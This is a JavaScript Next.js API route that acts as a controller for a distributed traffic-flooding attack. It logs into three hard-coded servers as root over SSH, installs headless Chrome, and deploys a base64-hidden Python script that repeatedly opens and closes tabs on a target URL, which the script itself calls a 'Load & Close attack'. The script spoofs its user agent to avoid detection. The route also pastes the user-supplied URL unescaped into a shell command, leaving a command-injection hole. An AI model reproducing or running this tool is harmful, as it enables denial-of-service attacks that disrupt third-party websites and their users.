import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const SERVERS = [
  { host: '138.68.153.135', username: 'root' },
  { host: '188.166.159.196', username: 'root' },
  { host: '46.101.78.167', username: 'root' }
];

const PYTHON_SCRIPT_B64 = "CmZyb20gRHJpc3Npb25QYWdlIGltcG9ydCBDaHJvbWl1bVBhZ2UsIENocm9taXVtT3B0aW9ucwppbXBvcnQgc3lzCmltcG9ydCB0aW1lCmltcG9ydCByYW5kb20KCmRlZiBydW5fYXR0YWNrKHRhcmdldF91cmwpOgogICAgY28gPSBDaHJvbWl1bU9wdGlvbnMoKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWhlYWRsZXNzPW5ldycpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tbm8tc2FuZGJveCcpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1ncHUnKQoKICAgICMgUmFuZG9tIHVzZXIgYWdlbnQgdG8gYXZvaWQgZGV0ZWN0aW9uCiAgICBjby5zZXRfdXNlcl9hZ2VudCgnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2JykKCiAgICB0cnk6CiAgICAgICAgcGFnZSA9IENocm9taXVtUGFnZShhZGRyX29yX29wdHM9Y28pCiAgICAgICAgcHJpbnQoZiJTdGFydGluZyBMb2FkICYgQ2xvc2UgYXR0YWNrIG9uIHt0YXJnZXRfdXJsfSIpCgogICAgICAgIGNvdW50ID0gMAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICMgQ3JlYXRlIG5ldyB0YWIgYW5kIGxvYWQKICAgICAgICAgICAgICAgIHRhYiA9IHBhZ2UubmV3X3RhYih0YXJnZXRfdXJsKQogICAgICAgICAgICAgICAgIyBXYWl0IGEgcmFuZG9tIGJpdAogICAgICAgICAgICAgICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgwLjUsIDEuNSkpCiAgICAgICAgICAgICAgICAjIENsb3NlIHRhYgogICAgICAgICAgICAgICAgdGFiLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgICAgICAgICAgICAgIGlmIGNvdW50ICUgMTAgPT0gMDoKICAgICAgICAgICAgICAgICAgICBwcmludChmIkV4ZWN1dGVkIHtjb3VudH0gaGl0cyIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgaW4gbG9vcDoge2V9IikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJGYXRhbCBlcnJvcjoge2V9IikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB1cmwgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJodHRwOi8vZXhhbXBsZS5jb20iCiAgICBydW5fYXR0YWNrKHVybCkK";

const SETUP_COMMAND = `
apt update -y && apt upgrade -y &&
apt install -y python3 python3-pip wget gnupg2 libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2 fonts-liberation libappindicator3-1 xdg-utils &&
wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb &&
apt install -y ./google-chrome-stable_current_amd64.deb &&
rm -f google-chrome-stable_current_amd64.deb &&
pip3 install DrissionPage &&
echo "SETUP_COMPLETE"
`.trim().replace(/\n/g, ' ');

async function executeOnServer(server, command, timeout = 20000) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error('Connection timeout'));
    }, timeout);

    conn.on('ready', () => {
      clearTimeout(timer);
      conn.exec(command, (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }
        let output = '';
        stream.on('close', () => {
          conn.end();
          resolve(output);
        }).on('data', (data) => {
          output += data;
        }).stderr.on('data', (data) => {
          output += data;
        });
      });
    }).on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    }).connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 20000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url } = await req.json();
    const results = [];

    for (const server of SERVERS) {
      try {
        let command = '';
        let timeout = 20000;

        if (action === 'setup') {
          command = SETUP_COMMAND;
          timeout = 300000;
        } else if (action === 'deploy') {
          command = `echo "${PYTHON_SCRIPT_B64}" | base64 -d > /root/visit.py && echo "Script deployed successfully"`;
        } else if (action === 'start') {
          if (!url) throw new Error("URL is required");
          command = `nohup python3 /root/visit.py "${url}" > /dev/null 2>&1 & echo "Attack started on ${url}"`;
        } else if (action === 'stop') {
          command = `pkill -f visit.py && echo "All processes stopped" || echo "No process found"`;
        } else {
          throw new Error("Unknown action");
        }

        const output = await executeOnServer(server, command, timeout);
        const isSuccess = action === 'setup' ? output.includes('SETUP_COMPLETE') : true;
        results.push({
          host: server.host,
          status: isSuccess ? 'success' : 'error',
          output: action === 'setup'
            ? (isSuccess ? 'Server setup completed successfully!' : 'Setup may have issues, check logs.')
            : output.trim()
        });
      } catch (error) {
        console.error(`Error on ${server.host}:`, error);
        results.push({ host: server.host, status: 'error', error: error.message });
      }
    }

    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
